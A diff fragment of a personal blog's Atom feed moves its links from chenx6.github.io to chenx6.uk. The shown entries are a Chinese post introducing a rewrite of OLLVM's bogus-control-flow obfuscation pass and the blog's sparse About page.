-        <content type="html" xml:base="https://chenx6.github.io/post/rewrite_ollvm_bcf/">&lt;p&gt;由于我个人觉得 OLLVM 的代码年久失修，所以就新建了个项目，开始学习并重写 OLLVM。项目地址：&lt;a rel=&quot;external&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;chenx6&#x2F;baby_obfuscator&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;chenx6&#x2F;baby_obfuscator&lt;&#x2F;a&gt;。如果将我的重写项目和 OLLVM 相比的话，我的项目的优点就是编译比较快（编译整个项目只需要不到 1 分钟），代码比较“新”吧...&lt;&#x2F;p&gt;
+        <content type="html" xml:base="https://chenx6.uk/post/rewrite_ollvm_bcf/">&lt;p&gt;由于我个人觉得 OLLVM 的代码年久失修，所以就新建了个项目，开始学习并重写 OLLVM。项目地址：&lt;a rel=&quot;external&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;chenx6&#x2F;baby_obfuscator&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;chenx6&#x2F;baby_obfuscator&lt;&#x2F;a&gt;。如果将我的重写项目和 OLLVM 相比的话，我的项目的优点就是编译比较快（编译整个项目只需要不到 1 分钟），代码比较“新”吧...&lt;&#x2F;p&gt;
 &lt;p&gt;下面讲讲我个人重写虚假控制流的思路，以及对其他项目中相同功能的理解。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;什么是虚假控制流_(Bogus_control_flow)&quot;&gt;什么是虚假控制流 (Bogus control flow)&lt;&#x2F;h2&gt;
 &lt;p&gt;在讲解虚假控制流时，我们先解释一些名词，然后看下流程表示就可以知道大概了。&lt;&#x2F;p&gt;
@@ -6139,10 +6139,10 @@ $$&lt;&#x2F;p&gt;
           </name>
         </author>
         
-        <link rel="alternate" type="text/html" href="https://chenx6.github.io/about/"/>
-        <id>https://chenx6.github.io/about/</id>
+        <link rel="alternate" type="text/html" href="https://chenx6.uk/about/"/>
+        <id>https://chenx6.uk/about/</id>
         
-        <content type="html" xml:base="https://chenx6.github.io/about/">&lt;p&gt;这是一个介绍页面，但是我不知道该写什么…&lt;&#x2F;p&gt;
+        <content type="html" xml:base="https://chenx6.uk/about/">&lt;p&gt;这是一个介绍页面，但是我不知道该写什么…&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;个人介绍&quot;&gt;个人介绍&lt;&#x2F;h2&gt;
 &lt;ul&gt;
 &lt;li&gt;对软件逆向工程感兴趣&lt;&#x2F;li&gt;
